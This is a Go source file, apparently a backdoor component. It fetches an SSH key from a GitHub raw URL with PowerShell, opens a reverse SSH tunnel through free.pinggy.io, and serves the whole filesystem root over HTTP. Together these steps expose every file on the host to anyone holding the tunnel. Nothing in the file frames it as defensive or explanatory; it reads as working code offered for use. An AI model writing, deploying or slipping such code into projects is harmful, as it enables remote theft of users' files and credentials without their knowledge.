package tunnel

import (
	"bytes"
	"net/http"
	//"container/list"
	"fmt"
	//"io"

	"os"
	"os/exec"
)



var port string = "3333"
var system string = "windows"
var logF string = "info.txt"


func InitTunne()bool{
	
	var out bytes.Buffer
	
	var command string = fmt.Sprintf(`ssh -i .\key -T -p 443 -R0:127.0.0.1:%s free.pinggy.io > %s`, port, logF)
	runTunnel  := commandToRun(system, command)	

	
	key := existsFile("key")
	if(!key){
		var cpKey string = "iwr https://raw.githubusercontent.com/xosuu/messi/refs/heads/main/key -outfile key"
		var cpKeyPub string = "iwr https://raw.githubusercontent.com/xosuu/messi/refs/heads/main/key.pub -outfile key.pub"
		copyKey := commandToRun(system, cpKey)
		copyKeyPub := commandToRun(system, cpKeyPub)
		exec.Command(copyKey[0], copyKey[1], copyKey[2]).Run()
		exec.Command(copyKeyPub[0], copyKeyPub[1], copyKeyPub[2]).Run()

	}


	fmt.Println("Starting tun....")
	cmd := exec.Command(runTunnel[0], runTunnel[1], runTunnel[2])
	cmd.Stdout = &out
	//stout, err := cmd.StdoutPipe()
	//if(err != nil){fmt.Println(err)}

	er := cmd.Run()
	if(er != nil){
		return false
	}
	//fmt.Println(string(out.String()))
	fmt.Print("ok.")
	return true
}



func ServerTunn()bool{
	fmt.Println("start serv...")
	//s := &http.Server{Addr: ":3009"}
	
	resp :=http.FileServer(http.Dir("/"))
	
	http.Handle("/", resp)
	

	fmt.Println("INICIANDO SERVER..")
	err := http.ListenAndServe(":"+port, nil)
	if(err != nil){
		fmt.Println(err)
		return false
	}
	
	return true

}



func existsFile(file string)bool{
	_, err := os.Stat(file)
	if(err != nil){
		return false
	}

	return true
}


func commandToRun(os string, command string)[3]string{

	type Os struct {
		Windows [3]string 
		Linux [3]string 
	}
	cmd := Os{Windows: [3]string{"powershell", "-command", command}, Linux: [3]string{"bash", "-c", command}}
	sys := bytes.ToLower([]byte(os))
	if( string(sys) == "linux" )  {
		return cmd.Linux
	}else if ( string(sys) == "windows"){
		return cmd.Windows
	}
	
	return [3]string{"Os", "No", "Available"}
}
